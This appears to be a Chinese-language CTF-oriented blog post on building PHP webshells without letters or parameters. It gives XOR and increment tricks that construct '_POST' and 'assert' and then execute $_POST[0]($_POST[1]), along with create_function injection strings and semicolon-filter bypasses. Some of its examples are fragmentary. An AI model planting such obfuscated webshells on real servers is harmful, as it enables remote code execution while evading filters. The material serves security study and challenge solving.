#  php webshell的研究
只是总结一些常见的姿势,大佬轻喷
## 无字母的情况
一个经典的示例
    简单的示例
    @$_++; //1
    $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");  // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
    $a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);
    \\assert
    $b = "_" . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;
    \\$b = $_POST
    $a($c[777]);
如果碰到ascii限制比较多的题目,也可以通过
    ((1 / 0) . Φ){1}
    ((9999999999999999999 ** 99999999999999999) . Φ)
得到其他字符,然后在进行位运算,生成需要的字符
可以参考RCTF2020 calc
#### 自增运算符
在处理字符变量的算数运算时,自曾操作会`'a'++ => 'b'`，`'b'++ =>
'c'`,所以我们只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符
那么,我们怎么得到第一个字母呢
  * 方法一
    var_dump(([] . Φ)[0]);  //A
    var_dump(([] . Φ)[3]);  //a
利用数组强转字符串会变为Array 得到需要的字符
示例
一些其他的姿势
    code=?>
    匹配/bin/cat flag.php 直接输出flag
  * 姿势二
    ?>
利用位运算生成$_GET并且先被解析,我们只要GET传参%a0即可执行系统命令。
## 有字母的情况
一个简单的示例
### 无参数命令执行
基本形式,
    `,是可以不用;的,
而在eval中,是可以使用多个?>的,所以
可以绕过;的限制
  * php7 执行任意代码的函数
在php7开始,assert改语言结构了,不能在动态拼接,执行
可以使用
    create_function('$arg){}var_dump(1);//', '');
    create_function('', '}var_dump(1);/*');
    create_function('', 'phpinfo()')();  //限php7
替代
  * php 变量名
php的变量名是没有仅下划线和数字字母的限制的,
甚至0字节都可以作为变量名,
在构造shell为了方便显示我们可以使用
Unicode码,作为不同的变量,方便构造
如
    /* system(id) */